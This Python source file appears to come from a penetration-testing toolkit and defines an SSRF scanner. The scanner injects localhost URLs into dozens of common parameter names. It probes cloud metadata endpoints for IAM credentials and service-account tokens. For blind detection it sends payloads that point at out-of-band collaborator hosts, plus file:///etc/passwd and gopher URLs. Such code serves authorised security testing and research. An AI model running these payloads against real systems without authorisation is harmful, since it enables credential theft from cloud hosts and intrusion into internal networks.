import json
import urllib.parse
import urllib.request
import socket
import time
from urllib.parse import urlparse
from utils.output import section, info, success, warning, error, result, table


class SsrfScanner:
    description = "Blind and reflected SSRF detection with out-of-band verification"

    COLLABORATORS = [
        "burpcollaborator.net",
        "interactsh.com",
        "oastify.com",
        "oast.pro",
        "rce.ee",
        "dnslog.cn",
    ]

    METADATA_URLS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
    ]

    @staticmethod
    def run(url="", urls="", method="GET", data="", headers_json="", timeout=10, threads=10, blind=False, collaborator="", **kwargs):
        section("SSRF Scanner")

        targets = []
        if url:
            targets.append(url)
        if urls:
            targets.extend(url.strip() for url in urls.split(",") if url.strip())

        if not targets:
            error("No target URL(s) provided (use --url)")
            return {"error": "no targets"}

        if headers_json:
            try:
                custom_headers = json.loads(headers_json)
            except:
                warning("Invalid --headers JSON, ignoring")
                custom_headers = {}
        else:
            custom_headers = {}

        result_data = {
            "targets": targets,
            "reflected_findings": [],
            "blind_findings": [],
            "metadata_findings": [],
            "collaborator_used": collaborator or "",
        }

        for target in targets:
            section(f"Testing: {target}")

            # 1. Reflected SSRF via common parameter injection
            SsrfScanner._test_reflected(target, method, data, custom_headers, timeout, result_data)

            # 2. Cloud metadata probing
            SsrfScanner._test_metadata(target, timeout, result_data)

            # 3. Blind SSRF via collaborator
            if blind or collaborator:
                SsrfScanner._test_blind(target, method, data, custom_headers, timeout, collaborator, result_data)

        section("SSRF Scan Complete")
        total = len(result_data["reflected_findings"]) + len(result_data["blind_findings"]) + len(result_data["metadata_findings"])
        success(f"Found {total} potential SSRF vectors")

        if result_data["reflected_findings"]:
            info("Reflected findings: check URLs that echoed your input back in the response")

        if result_data["blind_findings"]:
            info("Blind findings: check your collaborator for incoming connections")

        if result_data["metadata_findings"]:
            warning("Metadata endpoints accessible! Possible cloud metadata exposure")

        return result_data

    @staticmethod
    def _test_reflected(target, method, data, custom_headers, timeout, result_data):
        info("Testing reflected SSRF vectors")

        ssrf_params = [
            "url", "URL", "u", "q", "s", "src", "source", "link", "href",
            "redirect", "return", "return_to", "return_url", "next",
            "goto", "target", "dest", "destination", "out", "view",
            "file", "load", "read", "page", "p", "path", "doc",
            "data", "ajax", "image", "img", "css", "import",
        ]

        test_urls = [
            "http://127.0.0.1:8080/ssrf-test",
            "http://localhost:80/ssrf-test",
            "http://0.0.0.0:22/ssrf-test",
            "http://[::1]:8080/ssrf-test",
        ]

        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for param in ssrf_params:
            for test_url in test_urls:
                injected_url = f"{base}?{param}={urllib.parse.quote(test_url, safe='')}"
                if "?" in target:
                    injected_url = f"{target}&{param}={urllib.parse.quote(test_url, safe='')}"

                try:
                    req = urllib.request.Request(injected_url)
                    for k, v in custom_headers.items():
                        req.add_header(k, v)

                    if method == "POST":
                        req.method = "POST"
                        if data:
                            req.data = data.replace(f"${param}", test_url).encode()

                    with urllib.request.urlopen(req, timeout=timeout) as resp:
                        body = resp.read().decode("utf-8", errors="replace")
                        if test_url.split("/")[2] in body:
                            finding = {"parameter": param, "injected_url": test_url, "reflected": True, "verified": True, "url": injected_url}
                            result_data["reflected_findings"].append(finding)
                            success(f"Reflected SSRF via param '{param}' with {test_url}")
                        elif resp.status == 500:
                            finding = {"parameter": param, "injected_url": test_url, "reflected": False, "error_500": True, "url": injected_url}
                            result_data["reflected_findings"].append(finding)
                            warning(f"Possible blind SSRF via param '{param}' (500 error)")
                except Exception as e:
                    pass

    @staticmethod
    def _test_metadata(target, timeout, result_data):
        info("Testing cloud metadata endpoints")

        for meta_url in SsrfScanner.METADATA_URLS:
            injected = target.replace("=SSRF", f"={urllib.parse.quote(meta_url, safe='')}")
            if "=" not in target:
                continue

            try:
                req = urllib.request.Request(injected, headers={"Metadata": "true"})
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    body = resp.read().decode("utf-8", errors="replace")[:500]
                    if resp.status == 200 and body.strip():
                        finding = {"injected_url": meta_url, "response": body[:200], "status": resp.status}
                        result_data["metadata_findings"].append(finding)
                        warning(f"Cloud metadata accessible via {meta_url}")
                        success(f"Response: {body[:100]}...")
            except:
                pass

    @staticmethod
    def _test_blind(target, method, data, custom_headers, timeout, collaborator, result_data):
        collab = collaborator or SsrfScanner.COLLABORATORS[0]
        info(f"Testing blind SSRF with collaborator: {collab}")

        ssrf_params = ["url", "URL", "u", "q", "s", "src", "source", "redirect", "next", "dest", "page", "file", "load", "read"]

        blind_payloads = [
            f"http://{collab}/ssrf",
            f"http://ssrf.{collab}/x",
            f"http://{collab}/?id={int(time.time())}",
            f"dns://{collab}",
            f"file:///etc/passwd",
            f"gopher://{collab}:80/_GET / HTTP/1.1",
        ]

        for param in ssrf_params:
            for payload in blind_payloads:
                try:
                    injected_url = target
                    if "?" in target:
                        injected_url = f"{target}&{param}={urllib.parse.quote(payload, safe='')}"
                    else:
                        if "=" in target:
                            injected_url = target.replace("=", f"={urllib.parse.quote(payload, safe='')}", 1)

                    req = urllib.request.Request(injected_url)
                    for k, v in custom_headers.items():
                        req.add_header(k, v)
                    with urllib.request.urlopen(req, timeout=timeout) as resp:
                        if resp.status in (200, 302, 500):
                            finding = {"parameter": param, "payload": payload, "url": injected_url, "status": resp.status}
                            result_data["blind_findings"].append(finding)
                            info(f"Sent blind SSRF via param '{param}' -> {payload[:50]}...")
                except:
                    pass
